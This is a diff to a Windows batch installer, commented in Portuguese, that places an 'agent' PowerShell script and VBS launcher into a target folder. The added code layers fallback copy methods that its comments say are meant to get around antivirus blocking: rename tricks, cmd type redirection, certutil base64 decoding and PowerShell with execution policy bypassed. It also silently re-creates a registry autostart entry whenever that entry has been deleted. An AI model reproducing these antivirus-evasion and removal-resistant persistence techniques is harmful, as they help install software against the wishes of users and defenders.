@@ -127,8 +127,23 @@ echo [%DATE% %TIME%]   Metodo 1 falhou >> "%LOG_FILE%"
 echo [%DATE% %TIME%]   Metodo 2: copia como .txt + rename >> "%LOG_FILE%"
 copy /y "%SCRIPT_NAME%"   "%TARGET_DIR%\%SCRIPT_NAME%.txt" >nul 2>&1
 copy /y "%LAUNCHER_NAME%" "%TARGET_DIR%\%LAUNCHER_NAME%.txt" >nul 2>&1
+
+:: 2a: Tenta rename (bloqueado por alguns AVs)
 if exist "%TARGET_DIR%\%SCRIPT_NAME%.txt"   ren "%TARGET_DIR%\%SCRIPT_NAME%.txt"   "%SCRIPT_NAME%"   >nul 2>&1
 if exist "%TARGET_DIR%\%LAUNCHER_NAME%.txt" ren "%TARGET_DIR%\%LAUNCHER_NAME%.txt" "%LAUNCHER_NAME%" >nul 2>&1
+call :check_file "%TARGET_DIR%\%SCRIPT_NAME%"
+if %FILE_OK%==1 call :check_file "%TARGET_DIR%\%LAUNCHER_NAME%"
+if %FILE_OK%==1 goto copy_verified
+
+:: 2b: Se rename falhou, converte .txt -> .ps1 via cmd type redirect
+::     (cmd redirection opera em nivel diferente das APIs .NET/PowerShell)
+echo [%DATE% %TIME%]   Metodo 2b: type redirect .txt -^> .ps1 >> "%LOG_FILE%"
+if exist "%TARGET_DIR%\%SCRIPT_NAME%.txt" (
+    type "%TARGET_DIR%\%SCRIPT_NAME%.txt" > "%TARGET_DIR%\%SCRIPT_NAME%"
+)
+if exist "%TARGET_DIR%\%LAUNCHER_NAME%.txt" (
+    type "%TARGET_DIR%\%LAUNCHER_NAME%.txt" > "%TARGET_DIR%\%LAUNCHER_NAME%"
+)
 call :check_file "%TARGET_DIR%\%SCRIPT_NAME%"
 if %FILE_OK%==1 call :check_file "%TARGET_DIR%\%LAUNCHER_NAME%"
 if %FILE_OK%==1 goto copy_verified
@@ -153,29 +168,52 @@ echo [%DATE% %TIME%]   Metodo 3 falhou >> "%LOG_FILE%"
 ::    Usa ferramenta nativa do Windows para escrever arquivos
 :: ============================================================
 echo [%DATE% %TIME%]   Metodo 4: certutil decode >> "%LOG_FILE%"
-powershell -NoProfile -ExecutionPolicy Bypass -Command "
-    [Convert]::ToBase64String([IO.File]::ReadAllBytes((Join-Path (Get-Location) '%SCRIPT_NAME%'))) | Out-File '%TEMP%\agent_ps1.b64' -Encoding ASCII;
-    [Convert]::ToBase64String([IO.File]::ReadAllBytes((Join-Path (Get-Location) '%LAUNCHER_NAME%'))) | Out-File '%TEMP%\agent_vbs.b64' -Encoding ASCII
-" >nul 2>&1
-certutil -decode "%TEMP%\agent_ps1.b64" "%TARGET_DIR%\%SCRIPT_NAME%" >nul 2>&1
-certutil -decode "%TEMP%\agent_vbs.b64" "%TARGET_DIR%\%LAUNCHER_NAME%" >nul 2>&1
-del /f /q "%TEMP%\agent_ps1.b64" "%TEMP%\agent_vbs.b64" >nul 2>&1
-call :check_file "%TARGET_DIR%\%SCRIPT_NAME%"
-if %FILE_OK%==1 call :check_file "%TARGET_DIR%\%LAUNCHER_NAME%"
-if %FILE_OK%==1 goto copy_verified
+certutil.exe >nul 2>&1 && (
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "
+        try {
+            [Convert]::ToBase64String([IO.File]::ReadAllBytes((Join-Path (Get-Location) '%SCRIPT_NAME%'))) | Out-File '%TEMP%\agent_ps1.b64' -Encoding ASCII;
+            [Convert]::ToBase64String([IO.File]::ReadAllBytes((Join-Path (Get-Location) '%LAUNCHER_NAME%'))) | Out-File '%TEMP%\agent_vbs.b64' -Encoding ASCII
+        } catch { exit 1 }
+    " >nul 2>&1
+    if exist "%TEMP%\agent_ps1.b64" certutil -decode "%TEMP%\agent_ps1.b64" "%TARGET_DIR%\%SCRIPT_NAME%" >nul 2>&1
+    if exist "%TEMP%\agent_vbs.b64" certutil -decode "%TEMP%\agent_vbs.b64" "%TARGET_DIR%\%LAUNCHER_NAME%" >nul 2>&1
+    del /f /q "%TEMP%\agent_ps1.b64" "%TEMP%\agent_vbs.b64" >nul 2>&1
+    call :check_file "%TARGET_DIR%\%SCRIPT_NAME%"
+    if %FILE_OK%==1 call :check_file "%TARGET_DIR%\%LAUNCHER_NAME%"
+    if %FILE_OK%==1 goto copy_verified
+) else (
+    echo [%DATE% %TIME%]   certutil nao disponivel, pulando metodo 4 >> "%LOG_FILE%"
+)
 echo [%DATE% %TIME%]   Metodo 4 falhou >> "%LOG_FILE%"
 
 :: ============================================================
-:: Metodo 5: Aguarda 5s e tenta POWERSHELL -Command (escrita inline)
-::    Escreve o conteudo brute-force via pipeline do PowerShell
+:: Metodo 5: copy .txt + cmd type com retry 3s
+::    Cmd.exe redirect cria arquivo .ps1 a partir do .txt existente
 :: ============================================================
-echo [%DATE% %TIME%]   Metodo 5: aguardando 5s + PowerShell inline >> "%LOG_FILE%"
-timeout /t 5 /nobreak >nul
-powershell -NoProfile -ExecutionPolicy Bypass -Command "& { Get-Content '.\%SCRIPT_NAME%' -Raw | Set-Content '%TARGET_DIR%\%SCRIPT_NAME%' -Encoding UTF8; Get-Content '.\%LAUNCHER_NAME%' -Raw | Set-Content '%TARGET_DIR%\%LAUNCHER_NAME%' -Encoding UTF8 }" >nul 2>&1
+echo [%DATE% %TIME%]   Metodo 5: type redirect com delay >> "%LOG_FILE%"
+timeout /t 3 /nobreak >nul
+if exist "%TARGET_DIR%\%SCRIPT_NAME%.txt" (
+    type "%TARGET_DIR%\%SCRIPT_NAME%.txt" > "%TARGET_DIR%\%SCRIPT_NAME%"
+)
+if exist "%TARGET_DIR%\%LAUNCHER_NAME%.txt" (
+    type "%TARGET_DIR%\%LAUNCHER_NAME%.txt" > "%TARGET_DIR%\%LAUNCHER_NAME%"
+)
 call :check_file "%TARGET_DIR%\%SCRIPT_NAME%"
 if %FILE_OK%==1 call :check_file "%TARGET_DIR%\%LAUNCHER_NAME%"
 if %FILE_OK%==1 goto copy_verified
 echo [%DATE% %TIME%]   Metodo 5 falhou >> "%LOG_FILE%"
+
+:: ============================================================
+:: Metodo 6: PowerShell inline com Get-Content + Set-Content
+::    Ultimo recurso antes de declarar falha
+:: ============================================================
+echo [%DATE% %TIME%]   Metodo 6: PowerShell Get-Content / Set-Content >> "%LOG_FILE%"
+timeout /t 3 /nobreak >nul
+powershell -NoProfile -ExecutionPolicy Bypass -Command "& { Get-Content '.\%SCRIPT_NAME%' -Raw | Set-Content '%TARGET_DIR%\%SCRIPT_NAME%' -Encoding UTF8; Get-Content '.\%LAUNCHER_NAME%' -Raw | Set-Content '%TARGET_DIR%\%LAUNCHER_NAME%' -Encoding UTF8 }" >nul 2>&1
+call :check_file "%TARGET_DIR%\%SCRIPT_NAME%"
+if %FILE_OK%==1 call :check_file "%TARGET_DIR%\%LAUNCHER_NAME%"
+if %FILE_OK%==1 goto copy_verified
+echo [%DATE% %TIME%]   Metodo 6 falhou >> "%LOG_FILE%"
 
 :: ============================================================
 :: Todos os metodos falharam
@@ -277,6 +315,21 @@ timeout /t 3 /nobreak >nul
 call :check_file_verbose "%TARGET_DIR%\%SCRIPT_NAME%"
 call :check_file_verbose "%TARGET_DIR%\%LAUNCHER_NAME%"
 call :check_file_verbose "%TARGET_DIR%\%CONFIG_NAME%"
+
+:: Se registro foi deletado, re-adiciona
+reg query "%REG_KEY%" /v "%REG_NAME%" >nul 2>&1
+if %errorlevel% NEQ 0 (
+    echo [%DATE% %TIME%]   Registro ausente na re-verificacao, readicionando... >> "%LOG_FILE%"
+    reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "wscript.exe \"%TARGET_DIR%\%LAUNCHER_NAME%\"" /f >nul 2>&1
+)
+
+:: Se config.txt sumiu, re-copia
+if not exist "%TARGET_DIR%\%CONFIG_NAME%" (
+    if exist "%CONFIG_NAME%" (
+        echo [%DATE% %TIME%]   config.txt ausente na re-verificacao, recopiando... >> "%LOG_FILE%"
+        copy /y "%CONFIG_NAME%" "%TARGET_DIR%\%CONFIG_NAME%" >nul 2>&1
+    )
+)
 
 :: ============================================================
 :: Resultado final
